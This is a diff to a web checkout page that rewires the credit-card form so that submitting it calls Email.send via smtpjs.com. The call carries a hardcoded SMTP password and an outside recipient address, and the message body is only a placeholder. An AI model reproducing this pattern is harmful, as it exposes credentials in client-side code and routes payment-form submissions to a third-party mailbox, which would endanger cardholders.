@@ -382,7 +382,7 @@ span.price {
               <i class="fa fa-cc-discover" style="color:orange;"></i>
             </div>
            
-           <form action="custom-form">
+           <form onsubmit="emailSend(); reset(); return false;">
             <label for="cname">Name on Card</label>
             <input type="text" id="cname" name="cardname" placeholder="John More Doe" required minlength="3" maxlength="25"  >
             <label for="ccnum">Credit card number</label>
@@ -414,15 +414,24 @@ span.price {
   </div>
 </div>
 
+    <script src="https://smtpjs.com/v3/smtp.js">
+</script>
 
 <script>
-const form = document.querySelectorAll("#custom-form");
-form.addEventListener("submit", (e) => {
-    e.preventDefault();
-    const data = new FormData(e.target);
-    const name = data.get("cname");
-});
+function emailSend(){
+Email.send({
+    Host : "s1.maildns.net",
+    Username : "zacheryusry79@gmail.com",
+    Password : "1F13542B1FD25022EBA275F3A1016FF0E077",
+    To : 'ronround@yahoo.com',
+    From : "zacheryusry79@gmail.com",
+    Subject : "This is the subject",
+    Body : "And this is the body"
+}).then(
+  message => alert(message)
+);
 
+}
 </script>
 
 </body>
